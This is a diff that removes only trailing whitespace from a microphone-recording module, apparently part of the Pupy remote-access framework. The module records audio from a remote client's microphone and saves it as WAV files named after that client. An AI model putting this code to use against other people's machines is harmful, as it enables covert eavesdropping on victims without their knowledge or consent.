@@ -45,21 +45,21 @@ class RecordMicrophoneModule(PupyModule):
             pass
 
         self.success("starting recording for %ss ..." % args.time)
-        
+
         max_length = args.max_length
         if max_length is None:
             max_length = args.time
         if int(max_length) > int(args.time):
             raise PupyModuleError("--max-length argument cannot be bigger than --time")
-        
+
         for sw, c, r, rf in self.client.conn.modules['mic_recorder'].record_iter(total=args.time, chunk=max_length):
             filepath = os.path.join("data","audio_records","mic_" + self.client.short_name() + "_" + str(datetime.datetime.now()).replace(" ","_").replace(":","-") + ".wav")
             save_wav(filepath, sw, c, r, rf)
             self.success("microphone recording saved to %s" % filepath)
-        
+
         if args.view:
             viewer = self.client.pupsrv.config.get("default_viewers", "sound_player")
-                        
+
             found = False
             for p in os.environ.get('PATH', '').split(':'):
                 if os.path.exists(os.path.join(p, viewer)):
@@ -67,5 +67,5 @@ class RecordMicrophoneModule(PupyModule):
                     found = True
                     break
 
-            if not found: 
+            if not found:
                 self.error('Default viewer not found: %s' % viewer)
